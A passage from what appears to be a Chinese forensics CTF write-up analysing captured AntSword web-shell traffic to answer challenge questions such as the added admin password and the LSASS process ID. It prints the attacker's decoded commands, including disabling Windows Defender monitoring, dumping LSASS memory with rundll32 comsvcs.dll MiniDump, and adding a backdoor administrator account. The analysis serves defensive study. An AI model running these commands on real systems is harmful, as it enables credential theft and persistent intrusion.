0px; padding-right: 0px;\">Ctrl+F 查找admin关键词，查找到第一个数据包看到执行dir命令的返回结果，大概为黑客命令执行返回的结果，查看一下追踪流</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\"><img src=\"https://files.mdnice.com/user/73977/f3112352-7bf3-4f33-87e2-ba02df7f37a6.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%;\"> 可以看到，确实是恶意流量，木马文件为prodect2.php文件，密码是cmd</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">可以看到base64_decode关键词等，猜测使用蚁剑</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">直接搜索product2.php关键词</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\"><img src=\"https://files.mdnice.com/user/73977/3d5849ee-8e2c-4085-bed0-1c12b9051890.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%;\"> 查看第一个prodect2.php数据包的追踪流，进行url解码</p> \n<figure data-tool=\"mdnice编辑器\" style=\"margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: flex; flex-direction: column; justify-content: center; align-items: center;\"> \n <img src=\"https://files.mdnice.com/user/73977/39ac4e84-54bc-4479-af16-80838a194acc.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%; border-top-style: none; border-bottom-style: none; border-left-style: none; border-right-style: none; border-top-width: 3px; border-bottom-width: 3px; border-left-width: 3px; border-right-width: 3px; border-top-color: rgba(0, 0, 0, 0.4); border-bottom-color: rgba(0, 0, 0, 0.4); border-left-color: rgba(0, 0, 0, 0.4); border-right-color: rgba(0, 0, 0, 0.4); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; object-fit: fill; box-shadow: rgba(0, 0, 0, 0) 0px 0px 0px 0px;\"> \n</figure> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">格式化一下数据</p> \n<figure data-tool=\"mdnice编辑器\" style=\"margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: flex; flex-direction: column; justify-content: center; align-items: center;\"> \n <img src=\"https://files.mdnice.com/user/73977/4079d338-7fde-4cc6-bd3a-31b5c30a750f.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%; border-top-style: none; border-bottom-style: none; border-left-style: none; border-right-style: none; border-top-width: 3px; border-bottom-width: 3px; border-left-width: 3px; border-right-width: 3px; border-top-color: rgba(0, 0, 0, 0.4); border-bottom-color: rgba(0, 0, 0, 0.4); border-left-color: rgba(0, 0, 0, 0.4); border-right-color: rgba(0, 0, 0, 0.4); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; object-fit: fill; box-shadow: rgba(0, 0, 0, 0) 0px 0px 0px 0px;\"> \n</figure> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">解码之后可以看到蚁剑流量特征</p> \n<figure data-tool=\"mdnice编辑器\" style=\"margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: flex; flex-direction: column; justify-content: center; align-items: center;\"> \n <img src=\"https://files.mdnice.com/user/73977/e277d29a-f577-4d28-90c2-578a94752d5e.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%; border-top-style: none; border-bottom-style: none; border-left-style: none; border-right-style: none; border-top-width: 3px; border-bottom-width: 3px; border-left-width: 3px; border-right-width: 3px; border-top-color: rgba(0, 0, 0, 0.4); border-bottom-color: rgba(0, 0, 0, 0.4); border-left-color: rgba(0, 0, 0, 0.4); border-right-color: rgba(0, 0, 0, 0.4); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; object-fit: fill; box-shadow: rgba(0, 0, 0, 0) 0px 0px 0px 0px;\"> \n</figure> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">接着将product2.php的流量都进行解密查看：</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">去掉头两个字符之后进行base64解码</p> \n<pre class=\"custom\" data-tool=\"mdnice编辑器\" style=\"border-radius: 5px; box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px; text-align: left; margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px;\"><span style=\"display: block; background: url(https://files.mdnice.com/user/3441/876cad08-0422-409d-bb5a-08afec5da8ee.svg); height: 30px; width: 100%; background-size: 40px; background-repeat: no-repeat; background-color: #282c34; margin-bottom: -7px; border-radius: 5px; background-position: 10px 10px;\"></span><code class=\"hljs\" style=\"overflow-x: auto; padding: 16px; color: #abb2bf; padding-top: 15px; background: #282c34; border-radius: 5px; display: -webkit-box; font-family: Consolas, Monaco, Menlo, monospace; font-size: 12px;\">C:/phpStudy/PHPTutorial/WWW/onlineshop/database/onlineshop.sql<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:/phpStudy/PHPTutorial/WWW/onlineshop”&amp;ls&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;dir&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;whoami&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;whoami&nbsp;/priv&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;systeminfo&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;dir&nbsp;c:&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;dir&nbsp;c:\\temp&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;net&nbsp;user&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;net&nbsp;localgroup&nbsp;administrators&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;net&nbsp;group&nbsp;“domain&nbsp;group”&nbsp;/domain&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;net&nbsp;group&nbsp;“domain&nbsp;admins”&nbsp;/domain&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;net&nbsp;view&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;net&nbsp;share&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;rundll32.exe&nbsp;comsvcs.dll,&nbsp;MiniDump&nbsp;852&nbsp;<br>C:\\Temp\\OnlineShopBackup.zip&nbsp;full&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;dir&nbsp;c:\\temp&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;ls&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;dir&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;copy&nbsp;store.php&nbsp;c:\\temp&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;dir&nbsp;c:\\temp&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;powershell&nbsp;-ep&nbsp;bypass&nbsp;Set-Mppreference&nbsp;-DisableRaltimeMonitoring&nbsp;<span class=\"hljs-variable\" style=\"color: #d19a66; line-height: 26px;\">$true</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;rundll32.exe&nbsp;comsvcs.dll,&nbsp;MiniDump&nbsp;852&nbsp;C:\\temp\\OnlineShopBackup.zip&nbsp;full&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br>C:/Temp/OnlineShopBack.zip<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:/phpStudy/PHPTutorial/WWW/onlineshop”&amp;dir&nbsp;c:\\windows\\system32&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;dir&nbsp;c:\\windows\\config&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;net&nbsp;user&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;net&nbsp;user&nbsp;admin&nbsp;Password1&nbsp;/add&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;net&nbsp;localgroup&nbsp;administrators&nbsp;admin&nbsp;/add&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br><span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&nbsp;/d&nbsp;“C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;whoami&nbsp;/all&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[S]&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">cd</span>&amp;<span class=\"hljs-built_in\" style=\"color: #e6c07b; line-height: 26px;\">echo</span>&nbsp;[E]<br></code></pre> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">可以看到其中有一条添加 可以看到其中有一条添加admin账号命令</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">cd /d “C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;net user admin Password1 /add&amp;echo [S]&amp;cd&amp;echo [E]</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">所以密码为Password1</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">flag{Password1}</p> \n<h2 data-tool=\"mdnice编辑器\" style=\"border-bottom-color: rgb(89, 89, 89); margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; align-items: unset; background-attachment: scroll; background-clip: border-box; background-color: unset; background-image: none; background-origin: padding-box; background-position-x: 0%; background-position-y: 0%; background-repeat: no-repeat; background-size: auto; border-top-style: none; border-bottom-style: solid; border-left-style: none; border-right-style: none; border-top-width: 1px; border-bottom-width: 2px; border-left-width: 1px; border-right-width: 1px; border-top-color: rgb(0, 0, 0); border-left-color: rgb(0, 0, 0); border-right-color: rgb(0, 0, 0); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; box-shadow: none; display: flex; flex-direction: unset; float: unset; height: auto; justify-content: unset; line-height: 1.5em; overflow-x: unset; overflow-y: unset; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; position: relative; text-align: left; text-shadow: none; transform: none; width: auto; -webkit-box-reflect: unset;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 22px; color: rgb(89, 89, 89); border-bottom-color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; align-items: unset; background-attachment: scroll; background-clip: border-box; background-color: unset; background-image: none; background-origin: padding-box; background-position-x: 0%; background-position-y: 0%; background-repeat: no-repeat; background-size: auto; border-top-style: none; border-bottom-style: solid; border-left-style: none; border-right-style: none; border-top-width: 1px; border-bottom-width: 2px; border-left-width: 1px; border-right-width: 1px; border-top-color: rgb(0, 0, 0); border-left-color: rgb(0, 0, 0); border-right-color: rgb(0, 0, 0); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; box-shadow: none; display: block; font-weight: bold; flex-direction: unset; float: unset; height: auto; justify-content: unset; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; overflow-x: unset; overflow-y: unset; position: relative; text-align: left; text-indent: 0em; text-shadow: none; transform: none; width: auto; -webkit-box-reflect: unset;\">2、LSASS.exe的程序进程ID是多少？</span><span class=\"suffix\" style=\"display: none;\"></span></h2> \n<h3 data-tool=\"mdnice编辑器\" style=\"margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: block;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 20px; color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; text-align: left; font-weight: bold; display: block;\">解密找到如下命令：</span><span class=\"suffix\" style=\"display: none;\"></span></h3> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">cd /d “C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop”&amp;rundll32.exe comsvcs.dll, MiniDump 852 C:\\temp\\OnlineShopBackup.zip full&amp;echo [S]&amp;cd&amp;echo [E]</p> \n<h3 data-tool=\"mdnice编辑器\" style=\"margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: block;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 20px; color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; text-align: left; font-weight: bold; display: block;\">重点看此处：</span><span class=\"suffix\" style=\"display: none;\"></span></h3> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">rundll32.exe comsvcs.dll, MiniDump 852 C:\\temp\\OnlineShopBackup.zip full</p> \n<h3 data-tool=\"mdnice编辑器\" style=\"margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: block;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 20px; color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; text-align: left; font-weight: bold; display: block;\">rundll32.exe</span><span class=\"suffix\" style=\"display: none;\"></span></h3> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">rundll32.exe 是 Windows 操作系统中的一个实用程序，允许用户通过命令行运行基于 DLL 的函数。攻击者可以利用这个合法的系统工具来执行恶意操作，例如调用特定 DLL 文件中的函数来执行恶意代码</p> \n<h3 data-tool=\"mdnice编辑器\" style=\"margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: block;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 20px; color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; text-align: left; font-weight: bold; display: block;\">comsvcs.dll 和 MiniDump 函数</span><span class=\"suffix\" style=\"display: none;\"></span></h3> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; 